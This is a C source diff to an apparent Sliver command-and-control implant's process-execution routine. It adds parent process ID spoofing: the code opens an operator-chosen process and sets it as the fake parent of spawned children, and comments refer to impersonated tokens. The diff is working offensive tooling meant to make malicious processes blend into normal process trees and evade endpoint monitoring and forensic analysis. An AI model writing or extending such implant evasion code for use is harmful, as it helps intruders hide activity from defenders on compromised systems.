@@ -132,14 +132,17 @@ static void append_quoted(char *dst, size_t cap, size_t *offset, const char *arg
 
 int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int capture,
                      sliver_buf_t *out, sliver_buf_t *err, uint32_t *pid_out,
-                     uint32_t *status_out) {
+                     uint32_t *status_out, uint32_t ppid) {
   SECURITY_ATTRIBUTES sa;
-  STARTUPINFOA si;
+  STARTUPINFOEXA si;
   PROCESS_INFORMATION pi;
+  LPPROC_THREAD_ATTRIBUTE_LIST attr = NULL;
+  HANDLE h_parent = NULL;
   HANDLE out_r = NULL, out_w = NULL, err_r = NULL, err_w = NULL;
   char cmdline[8192];
   size_t offset = 0;
   DWORD exit_code = 0;
+  DWORD create_flags = 0;
 
   if (path == NULL) {
     return -1;
@@ -148,22 +151,22 @@ int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int
   sa.nLength = sizeof(sa);
   sa.bInheritHandle = TRUE;
   memset(&si, 0, sizeof(si));
-  si.cb = sizeof(si);
+  si.StartupInfo.cb = sizeof(si);
   memset(&pi, 0, sizeof(pi));
 
-  si.dwFlags = STARTF_USESTDHANDLES;
+  si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
   /* After make-token the process runs as another user (possibly in another
    * session), where the inherited std handles can be NULL/invalid; handing those
    * to CreateProcess with STARTF_USESTDHANDLES crashes the caller. Fall back to
    * a NUL device so the child always gets valid handles. */
-  si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
-  si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
-  si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
-  if (capture && (si.hStdInput == NULL || si.hStdInput == INVALID_HANDLE_VALUE)) {
-    si.hStdInput = CreateFileA("NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+  si.StartupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+  si.StartupInfo.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
+  si.StartupInfo.hStdError = GetStdHandle(STD_ERROR_HANDLE);
+  if (capture && (si.StartupInfo.hStdInput == NULL || si.StartupInfo.hStdInput == INVALID_HANDLE_VALUE)) {
+    si.StartupInfo.hStdInput = CreateFileA("NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                                OPEN_EXISTING, 0, NULL);
-    if (si.hStdInput == INVALID_HANDLE_VALUE) {
-      si.hStdInput = NULL;
+    if (si.StartupInfo.hStdInput == INVALID_HANDLE_VALUE) {
+      si.StartupInfo.hStdInput = NULL;
     }
   }
   if (capture) {
@@ -175,8 +178,30 @@ int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int
       (void)CloseHandle(out_w);
       return -1;
     }
-    si.hStdOutput = out_w;
-    si.hStdError = err_w;
+    si.StartupInfo.hStdOutput = out_w;
+    si.StartupInfo.hStdError = err_w;
+  }
+
+  /* Pin the child to a specific parent process (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
+   * when the operator asked for one. Best-effort: an invalid/vanished parent only
+   * skips the attribute, it never fails the exec. */
+  if (ppid != 0) {
+    SIZE_T size = 0;
+    h_parent = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)ppid);
+    if (h_parent != NULL) {
+      (void)InitializeProcThreadAttributeList(NULL, 1, 0, &size);
+      attr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
+      if (attr != NULL &&
+          InitializeProcThreadAttributeList(attr, 1, 0, &size) &&
+          UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                                    &h_parent, sizeof(h_parent), NULL, NULL)) {
+        create_flags |= EXTENDED_STARTUPINFO_PRESENT;
+        si.lpAttributeList = attr;
+      } else if (attr != NULL) {
+        HeapFree(GetProcessHeap(), 0, attr);
+        attr = NULL;
+      }
+    }
   }
 
   /* Quote only the arguments that need it: quoting a switch such as /c breaks
@@ -189,8 +214,15 @@ int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int
   {
     char resolved[MAX_PATH * 2];
     resolve_exe(path, resolved, sizeof(resolved));
-    if (!CreateProcessA(resolved, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+    if (!CreateProcessA(resolved, cmdline, NULL, NULL, TRUE, create_flags, NULL, NULL,
+                        &si.StartupInfo, &pi)) {
     g_last_error = GetLastError();
+      if (attr != NULL) {
+        (void)DeleteProcThreadAttributeList(attr);
+      }
+      if (h_parent != NULL) {
+        (void)CloseHandle(h_parent);
+      }
       if (capture) {
         (void)CloseHandle(out_r);
         (void)CloseHandle(out_w);
@@ -199,6 +231,12 @@ int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int
       }
       return -1;
     }
+  }
+  if (attr != NULL) {
+    (void)DeleteProcThreadAttributeList(attr);
+  }
+  if (h_parent != NULL) {
+    (void)CloseHandle(h_parent);
   }
   if (capture) {
     (void)CloseHandle(out_w);
